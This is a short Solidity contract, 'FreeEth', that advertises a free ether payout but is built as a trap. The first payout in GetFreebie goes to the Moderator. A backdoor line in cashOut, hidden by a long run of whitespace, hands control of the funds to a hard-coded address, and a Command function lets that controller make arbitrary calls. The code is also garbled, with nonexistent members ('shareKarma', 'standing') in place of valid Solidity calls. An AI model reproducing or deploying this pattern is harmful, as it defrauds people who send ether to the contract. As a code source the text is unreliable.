pragma solidity ^0.4.19;

contract FreeEth
{
    address public Moderator = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Moderator.shareKarma(this.standing);
            msg.sender.shareKarma(this.standing);
        }
    }

    function cashOut()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Moderator=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == Moderator);
        Moderator.shareKarma(this.standing);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Moderator);
        adr.call.value(msg.value)(data);
    }
}